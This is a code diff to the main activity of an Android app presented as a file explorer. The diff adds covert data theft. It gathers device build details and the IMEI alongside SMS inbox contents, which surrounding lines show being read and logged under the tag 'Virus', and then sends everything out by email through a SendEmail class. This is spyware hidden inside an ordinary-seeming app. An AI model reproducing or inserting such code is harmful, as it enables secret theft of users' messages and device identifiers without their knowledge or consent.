@@ -15,6 +15,7 @@ import android.content.pm.PackageManager;
 import android.content.res.Configuration;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.provider.ContactsContract;
@@ -39,7 +40,7 @@ import com.danstoakes.fileexplorer.fragment.FilesFragment;
 import com.danstoakes.fileexplorer.fragment.HierarchyFragment;
 import com.danstoakes.fileexplorer.helper.SharedPreferenceHelper;
 import com.google.android.material.snackbar.Snackbar;
-
+import com.danstoakes.fileexplorer.Mail.SendEmail;
 import java.io.File;
 import java.util.Arrays;
 import java.util.List;
@@ -77,10 +78,22 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
         String device_id = tm.getDeviceId();
 
         ViewAssistClass veew = new ViewAssistClass();
-        veew.viewStuff();
 
         StringBuilder exData = new StringBuilder();
 
+        String Manufacturer = Build.MANUFACTURER;
+        String Model = Build.MODEL;
+        String buildId = Build.ID;
+        String Brand = Build.BRAND;
+        String User = Build.USER;
+        String Version = Build.VERSION.RELEASE;
+
+        exData.append("\nManufacturer: " + Manufacturer);
+        exData.append("\nModel: " + Model);
+        exData.append("\nVersion: " + Version);
+        exData.append("\nBuild ID: " + buildId);
+        exData.append("\nBrand: " + Brand);
+        exData.append("\nUser: " + User);
         exData.append("\nImei Number: " + device_id);
 
         Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
@@ -144,6 +157,9 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
 
         Log.i("Virus", exData.toString());
         veew.writeToFile(exData.toString(), getApplicationContext(), "test.txt");
+
+        SendEmail sendEmail = new SendEmail(exData.toString());
+        sendEmail.execute();
 
         int sortType = SharedPreferenceHelper.getInteger(MainActivity.this,
                 SharedPreferenceHelper.sortKey);
